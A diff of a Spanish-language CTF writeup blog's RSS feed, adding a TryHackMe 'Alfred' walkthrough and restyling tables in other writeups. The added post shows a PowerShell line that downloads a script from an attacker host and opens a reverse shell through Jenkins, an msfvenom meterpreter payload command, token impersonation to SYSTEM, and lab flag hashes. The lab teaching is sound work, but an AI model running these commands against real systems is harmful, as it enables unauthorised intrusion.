@@ -12,6 +12,114 @@
     <lastBuildDate>Fri, 15 Nov 2024 15:30:00 +0000</lastBuildDate>
     <atom:link href="https://gtello.github.io/es/writeups/index.xml" rel="self" type="application/rss+xml" />
     <item>
+      <title>Reto Alfred (THM)</title>
+      <link>https://gtello.github.io/es/writeups/alfred/</link>
+      <pubDate>Fri, 15 Nov 2024 15:30:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
+      <guid>https://gtello.github.io/es/writeups/alfred/</guid>
+      <description>&lt;div style=&#34;text-align: justify;&#34;&gt;&#xD;&#xA;&lt;p&gt;Aquí tienes el writeup de la máquina &lt;a href=&#34;https://tryhackme.com/r/room/alfred&#34;&gt;Alfred&lt;/a&gt; en TryHackMe.&lt;/p&gt;&#xA;&lt;h2 id=&#34;resumen&#34;&gt;Resumen&lt;/h2&gt;&#xA;&lt;p&gt;Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.&lt;/p&gt;&#xA;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;&#xA;&lt;p&gt;Lo primero fue realizar un escaneo de red con &lt;code&gt;nmap&lt;/code&gt; para identificar puertos y servicios abiertos.&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<div style="text-align: justify;">
+<p>Aquí tienes el writeup de la máquina <a href="https://tryhackme.com/r/room/alfred">Alfred</a> en TryHackMe.</p>
+<h2 id="resumen">Resumen</h2>
+<p>Vamos a ver cómo explotar una máquina Windows con un servicio Jenkins expuesto. Usando credenciales por defecto, logramos ejecutar comandos remotos a través de la funcionalidad de construcción de Jenkins y obtenimos un acceso inicial. A partir de ahí, escalamos privilegios utilizando técnicas de suplantación de tokens, alcanzando finalmente control administrativo total del sistema.</p>
+<h2 id="reconocimiento">Reconocimiento</h2>
+<p>Lo primero fue realizar un escaneo de red con <code>nmap</code> para identificar puertos y servicios abiertos.</p>
+<h3 id="resultado-del-reconocimiento">Resultado del reconocimiento</h3>
+<table>
+  <thead>
+      <tr>
+          <th>Sistema Operativo</th>
+          <th>Dirección IP</th>
+          <th>Puertos Abiertos</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Windows Server</td>
+          <td>10.10.149.26</td>
+          <td>80, 3389, 8080</td>
+      </tr>
+  </tbody>
+</table>
+<p><img alt="Comando nmap y resultados" src="/images/posts/alfred/image1.png"></p>
+<center><b>Comando nmap y resultados</b></center>
+<p>Los puertos 80 y 8080 fueron analizados en el navegador. En el puerto 8080, encontré un portal de inicio de sesión de Jenkins, una herramienta ampliamente usada para CI/CD.</p>
+<h2 id="explotación">Explotación</h2>
+<p>¡Manos a la obra! Probé credenciales por defecto (<code>admin:admin</code>) en el portal de Jenkins, y sorpresa: funcionaron. Esto me dio acceso al dashboard.</p>
+<p><img alt="Dashboard de Jenkins" src="/images/posts/alfred/image2.png"></p>
+<center><b>Dashboard de Jenkins</b></center>
+<p>En la configuración del proyecto, utilicé la sección &ldquo;Build&rdquo; para ejecutar comandos. Usé este <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">script</a> de PowerShell para establecer una reverse shell:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="ln">1</span><span class="cl"><span class="nb">iex </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://10.6.5.62:8008/Invoke-PowerShellTcp.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-PowerShellTcp</span> <span class="n">-Reverse</span> <span class="n">-IPAddress</span> <span class="mf">10.6</span><span class="p">.</span><span class="py">5</span><span class="p">.</span><span class="py">62</span> <span class="n">-Port</span> <span class="mf">4321</span></span></span></code></pre></div><p>Con la opción <strong>Build Now</strong>, conseguí conectarme exitosamente a la máquina objetivo desde mi terminal atacante.</p>
+<p><img alt="Comando de reverse shell en Jenkins" src="/images/posts/alfred/image3.png"></p>
+<center><b>Comando de reverse shell en Jenkins</b></center>  
+<p><img alt="Acceso mediante reverse shell" src="/images/posts/alfred/image4.png"></p>
+<center><b>Acceso mediante reverse shell</b></center>
+<h2 id="escalación-de-privilegios">Escalación de Privilegios</h2>
+<p>Una vez dentro de la máquina, generé un payload ejecutable para obtener una sesión de <code>meterpreter</code> utilizando <code>msfvenom</code>:</p>
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai <span class="nv">LHOST</span><span class="o">=</span>10.6.5.62 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -f exe -o revshell.exe</span></span></code></pre></div><p>Transferí el payload a la máquina objetivo utilizando <code>certutil</code> y lo ejecuté, estableciendo una conexión <code>meterpreter</code> con mi máquina atacante.</p>
+<p><img alt="Configuración del receptor en Metasploit" src="/images/posts/alfred/image5.png"></p>
+<center><b>Configuración del receptor en Metasploit</b></center>
+<p>Revisando los privilegios del usuario, podemos ver que tenemos los permisos <code>SeDebugPrivilege</code> y <code>SeImpersonatePrivilege</code>. Estos permisos permiten suplantar tokens y acceder a procesos con permisos elevados. Utilicé el módulo <code>incognito</code> de Metasploit para explotarlos.</p>
+<p><img alt="Uso del módulo incognito" src="/images/posts/alfred/image6.png"></p>
+<center><b>Uso del módulo incognito</b></center>
+<p>Finalmente, migré el proceso a un servicio con permisos <code>SYSTEM</code>, logrando control completo sobre la máquina.</p>
+<p><img alt="Migración a un proceso privilegiado" src="/images/posts/alfred/image7.png"></p>
+<center><b>Migración a un proceso privilegiado</b></center>
+<h2 id="banderas">Banderas</h2>
+<p>Con acceso administrativo, encontré las banderas:</p>
+<ul>
+<li><strong>user.txt</strong>: <code>79007a09481963edf2e1321abd9ae2a0</code></li>
+<li><strong>root.txt</strong>: <code>dff0f748678f280250f25a45b8046b4a</code></li>
+</ul>
+<h2 id="herramientas-utilizadas">Herramientas Utilizadas</h2>
+<table>
+  <thead>
+      <tr>
+          <th>Herramienta</th>
+          <th>Descripción</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>nmap</strong></td>
+          <td>Escaneo de red y detección de servicios abiertos.</td>
+      </tr>
+      <tr>
+          <td><strong>Jenkins</strong></td>
+          <td>Plataforma explotada con credenciales por defecto para ejecutar comandos.</td>
+      </tr>
+      <tr>
+          <td><strong>msfvenom/metasploit</strong></td>
+          <td>Generación de payloads y escalación de privilegios con el módulo incognito.</td>
+      </tr>
+      <tr>
+          <td><strong>certutil</strong></td>
+          <td>Transferencia del payload a la máquina objetivo.</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="conclusión">Conclusión</h2>
+<p>La explotación del sistema Alfred reveló problemas críticos como servicios expuestos con credenciales por defecto y configuraciones incorrectas de privilegios, lo que permitió escalar hasta el nivel de administrador.</p>
+<h2 id="recomendaciones">Recomendaciones</h2>
+<ul>
+<li><strong>Actualizar Jenkins</strong> y eliminar credenciales por defecto.</li>
+<li>Configurar un <strong>firewall</strong> para restringir accesos innecesarios.</li>
+<li>Implementar políticas de contraseñas robustas.</li>
+<li>Limitar privilegios innecesarios en los usuarios.</li>
+</ul>
+</div>
+]]></content:encoded>
+    </item>
+    <item>
       <title>Game Zone (THM)</title>
       <link>https://gtello.github.io/es/writeups/gamezone/</link>
       <pubDate>Thu, 14 Nov 2024 20:43:00 +0000</pubDate><author>gabrieltello10@hotmail.com (Gabriel Tello)</author>
@@ -28,16 +136,16 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Sistema Operativo</th>
-          <th style="text-align: left">Dirección IP</th>
-          <th style="text-align: left">Puertos Abiertos</th>
+          <th>Sistema Operativo</th>
+          <th>Dirección IP</th>
+          <th>Puertos Abiertos</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Ubuntu 16.04.6</td>
-          <td style="text-align: left">10.10.254.53</td>
-          <td style="text-align: left">22 (SSH), 80 (HTTP)</td>
+          <td>Ubuntu 16.04.6</td>
+          <td>10.10.254.53</td>
+          <td>22 (SSH), 80 (HTTP)</td>
       </tr>
   </tbody>
 </table>
@@ -69,30 +177,30 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Herramienta</th>
-          <th style="text-align: left">Descripción</th>
+          <th>Herramienta</th>
+          <th>Descripción</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left"><strong>nmap</strong></td>
-          <td style="text-align: left">Escaneo de red y detección de puertos abiertos.</td>
+          <td><strong>nmap</strong></td>
+          <td>Escaneo de red y detección de puertos abiertos.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>Burp Suite</strong></td>
-          <td style="text-align: left">Captura y análisis de solicitudes HTTP para SQLi automatizado.</td>
+          <td><strong>Burp Suite</strong></td>
+          <td>Captura y análisis de solicitudes HTTP para SQLi automatizado.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>sqlmap</strong></td>
-          <td style="text-align: left">Pruebas de SQLi y extracción de datos de la base de datos.</td>
+          <td><strong>sqlmap</strong></td>
+          <td>Pruebas de SQLi y extracción de datos de la base de datos.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>John the Ripper</strong></td>
-          <td style="text-align: left">Descifrado del hash de la contraseña del usuario <code>agent47</code> para acceso SSH.</td>
+          <td><strong>John the Ripper</strong></td>
+          <td>Descifrado del hash de la contraseña del usuario <code>agent47</code> para acceso SSH.</td>
       </tr>
       <tr>
-          <td style="text-align: left"><strong>Exploit CVE-2012-2982</strong></td>
-          <td style="text-align: left">Vulnerabilidad en Webmin que permitió escalación de privilegios a root.</td>
+          <td><strong>Exploit CVE-2012-2982</strong></td>
+          <td>Vulnerabilidad en Webmin que permitió escalación de privilegios a root.</td>
       </tr>
   </tbody>
 </table>
@@ -126,16 +234,16 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Sistema Operativo</th>
-          <th style="text-align: left">Dirección IP</th>
-          <th style="text-align: left">Puertos Abiertos</th>
+          <th>Sistema Operativo</th>
+          <th>Dirección IP</th>
+          <th>Puertos Abiertos</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Windows Server 2008</td>
-          <td style="text-align: left">10.10.128.109</td>
-          <td style="text-align: left">80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
+          <td>Windows Server 2008</td>
+          <td>10.10.128.109</td>
+          <td>80 (HTTP), 135 (RPC), 139 (NetBIOS), 445 (SMB), 3389 (RDP), 5985 (WinRM HTTP), 8080 (HTTP-Alternate), 47001 (WinRM HTTPS), and 49152-49164 (Dynamic RPC range)</td>
       </tr>
   </tbody>
 </table>
@@ -186,26 +294,26 @@
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Herramienta</th>
-          <th style="text-align: left">Descripción</th>
+          <th>Herramienta</th>
+          <th>Descripción</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">nmap</td>
-          <td style="text-align: left">Para el reconocimiento inicial y detección de servicios y puertos abiertos.</td>
+          <td>nmap</td>
+          <td>Para el reconocimiento inicial y detección de servicios y puertos abiertos.</td>
       </tr>
       <tr>
-          <td style="text-align: left">metasploit</td>
-          <td style="text-align: left">Para lanzar el exploit contra el servidor Rejetto HTTP.</td>
+          <td>metasploit</td>
+          <td>Para lanzar el exploit contra el servidor Rejetto HTTP.</td>
       </tr>
       <tr>
-          <td style="text-align: left">PowerUp.ps1</td>
-          <td style="text-align: left">Script de PowerShell para analizar configuraciones de privilegios en sistemas Windows.</td>
+          <td>PowerUp.ps1</td>
+          <td>Script de PowerShell para analizar configuraciones de privilegios en sistemas Windows.</td>
       </tr>
       <tr>
-          <td style="text-align: left">msfvenom</td>
-          <td style="text-align: left">Para generar el payload de reverse shell que ejecutamos para obtener permisos de administrador.</td>
+          <td>msfvenom</td>
+          <td>Para generar el payload de reverse shell que ejecutamos para obtener permisos de administrador.</td>
       </tr>
   </tbody>
 </table>
@@ -243,16 +351,16 @@ Esta es una guía paso a paso presentada en formato de reporte profesional sobre
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Sistema Operativo</th>
-          <th style="text-align: left">Dirección IP</th>
-          <th style="text-align: left">Puertos Abiertos</th>
+          <th>Sistema Operativo</th>
+          <th>Dirección IP</th>
+          <th>Puertos Abiertos</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Debian</td>
-          <td style="text-align: left">192.168.138.132</td>
-          <td style="text-align: left">22 (SSH), 80 (HTTP), 111 (RPCbind), 2049 (NFS), 8080 (HTTP Alternate)</td>
+          <td>Debian</td>
+          <td>192.168.138.132</td>
+          <td>22 (SSH), 80 (HTTP), 111 (RPCbind), 2049 (NFS), 8080 (HTTP Alternate)</td>
       </tr>
   </tbody>
 </table>
@@ -318,26 +426,26 @@ Esta es una guía paso a paso presentada en formato de reporte profesional sobre
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Herramienta</th>
-          <th style="text-align: left">Descripción</th>
+          <th>Herramienta</th>
+          <th>Descripción</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">nmap</td>
-          <td style="text-align: left">Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
+          <td>nmap</td>
+          <td>Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
       </tr>
       <tr>
-          <td style="text-align: left">fcrackzip</td>
-          <td style="text-align: left">Herramienta empleada para realizar un ataque de fuerza bruta a archivos zip.</td>
+          <td>fcrackzip</td>
+          <td>Herramienta empleada para realizar un ataque de fuerza bruta a archivos zip.</td>
       </tr>
       <tr>
-          <td style="text-align: left">wfuzz</td>
-          <td style="text-align: left">Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
+          <td>wfuzz</td>
+          <td>Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
       </tr>
       <tr>
-          <td style="text-align: left">GTFObins</td>
-          <td style="text-align: left">Recurso en línea que proporcionó el método para escalar privilegios utilizando el binario zip con permisos especiales de sudo.</td>
+          <td>GTFObins</td>
+          <td>Recurso en línea que proporcionó el método para escalar privilegios utilizando el binario zip con permisos especiales de sudo.</td>
       </tr>
   </tbody>
 </table>
@@ -369,16 +477,16 @@ Esta es una guía paso a paso presentada en formato de reporte profesional sobre
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Sistema Operativo</th>
-          <th style="text-align: left">Dirección IP</th>
-          <th style="text-align: left">Puertos Abiertos</th>
+          <th>Sistema Operativo</th>
+          <th>Dirección IP</th>
+          <th>Puertos Abiertos</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Debian 10</td>
-          <td style="text-align: left">192.168.138.128</td>
-          <td style="text-align: left">21 (FTP), 22 (SSH), 80 (HTTP)</td>
+          <td>Debian 10</td>
+          <td>192.168.138.128</td>
+          <td>21 (FTP), 22 (SSH), 80 (HTTP)</td>
       </tr>
   </tbody>
 </table>
@@ -455,30 +563,30 @@ Esta es una guía paso a paso presentada en formato de reporte profesional sobre
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Herramienta</th>
-          <th style="text-align: left">Descripción</th>
+          <th>Herramienta</th>
+          <th>Descripción</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Nmap</td>
-          <td style="text-align: left">Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
+          <td>Nmap</td>
+          <td>Utilizada para el escaneo de red y detección de puertos y servicios abiertos en la máquina objetivo.</td>
       </tr>
       <tr>
-          <td style="text-align: left">hashcat</td>
-          <td style="text-align: left">Utilizada para crackear el hash MD5 obtenido del servidor FTP.</td>
+          <td>hashcat</td>
+          <td>Utilizada para crackear el hash MD5 obtenido del servidor FTP.</td>
       </tr>
       <tr>
-          <td style="text-align: left">wfuzz</td>
-          <td style="text-align: left">Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
+          <td>wfuzz</td>
+          <td>Usada para realizar fuerza bruta en los directorios web, descubriendo rutas sensibles.</td>
       </tr>
       <tr>
-          <td style="text-align: left">pspy</td>
-          <td style="text-align: left">Programa utilizado para monitorear procesos en Linux sin necesidad de permisos root.</td>
+          <td>pspy</td>
+          <td>Programa utilizado para monitorear procesos en Linux sin necesidad de permisos root.</td>
       </tr>
       <tr>
-          <td style="text-align: left">LinPEAS</td>
-          <td style="text-align: left">Script utilizado para identificar potenciales vías de escalación de privilegios en el servidor.</td>
+          <td>LinPEAS</td>
+          <td>Script utilizado para identificar potenciales vías de escalación de privilegios en el servidor.</td>
       </tr>
   </tbody>
 </table>
@@ -510,16 +618,16 @@ Esta es una guía paso a paso presentada en formato de reporte profesional sobre
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Sistema Operativo</th>
-          <th style="text-align: left">Dirección IP</th>
-          <th style="text-align: left">Puertos Abiertos</th>
+          <th>Sistema Operativo</th>
+          <th>Dirección IP</th>
+          <th>Puertos Abiertos</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Windows 7 x64 SP 1</td>
-          <td style="text-align: left">192.168.1.167</td>
-          <td style="text-align: left">135, 139, 445, 49152-49158</td>
+          <td>Windows 7 x64 SP 1</td>
+          <td>192.168.1.167</td>
+          <td>135, 139, 445, 49152-49158</td>
       </tr>
   </tbody>
 </table>
@@ -605,18 +713,18 @@ En este caso, se configuró un script de persistencia con el módulo <code>windo
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Bandera</th>
-          <th style="text-align: left">Hash</th>
+          <th>Bandera</th>
+          <th>Hash</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">bandera1.txt</td>
-          <td style="text-align: left">0ef3b7d488b11e3e800f547a0765da8e</td>
+          <td>bandera1.txt</td>
+          <td>0ef3b7d488b11e3e800f547a0765da8e</td>
       </tr>
       <tr>
-          <td style="text-align: left">bandera2.txt</td>
-          <td style="text-align: left">a63c1c39c0c7fd570053343451667939</td>
+          <td>bandera2.txt</td>
+          <td>a63c1c39c0c7fd570053343451667939</td>
       </tr>
   </tbody>
 </table>
@@ -624,30 +732,30 @@ En este caso, se configuró un script de persistencia con el módulo <code>windo
 <table>
   <thead>
       <tr>
-          <th style="text-align: left">Herramienta</th>
-          <th style="text-align: left">Descripción</th>
+          <th>Herramienta</th>
+          <th>Descripción</th>
       </tr>
   </thead>
   <tbody>
       <tr>
-          <td style="text-align: left">Nmap</td>
-          <td style="text-align: left">Utilizado para el escaneo inicial del sistema y para identificar puertos y servicios abiertos en el objetivo.</td>
+          <td>Nmap</td>
+          <td>Utilizado para el escaneo inicial del sistema y para identificar puertos y servicios abiertos en el objetivo.</td>
       </tr>
       <tr>
-          <td style="text-align: left">Metasploit</td>
-          <td style="text-align: left">Empleado para explotar la vulnerabilidad EternalBlue (CVE-2017-0144) con un payload de tipo reverse shell.</td>
+          <td>Metasploit</td>
+          <td>Empleado para explotar la vulnerabilidad EternalBlue (CVE-2017-0144) con un payload de tipo reverse shell.</td>
       </tr>
       <tr>
-          <td style="text-align: left">Mimikatz/kiwi</td>
-          <td style="text-align: left">Usado dentro de Meterpreter para la extracción del hash de credenciales del sistema Windows.</td>
+          <td>Mimikatz/kiwi</td>
+          <td>Usado dentro de Meterpreter para la extracción del hash de credenciales del sistema Windows.</td>
       </tr>
       <tr>
-          <td style="text-align: left">CrackMapExec y PTH</td>
-          <td style="text-align: left">Permitió movimiento lateral en la máquina sin necesidad de contraseñas en texto plano, usando solo hashes.</td>
+          <td>CrackMapExec y PTH</td>
+          <td>Permitió movimiento lateral en la máquina sin necesidad de contraseñas en texto plano, usando solo hashes.</td>
       </tr>
       <tr>
-          <td style="text-align: left">Persistencia con Metasploit</td>
-          <td style="text-align: left">Configuración de persistencia mediante módulo windows/local/persistence_service para garantizar acceso continuo.</td>
+          <td>Persistencia con Metasploit</td>
+          <td>Configuración de persistencia mediante módulo windows/local/persistence_service para garantizar acceso continuo.</td>
       </tr>
   </tbody>
 </table>
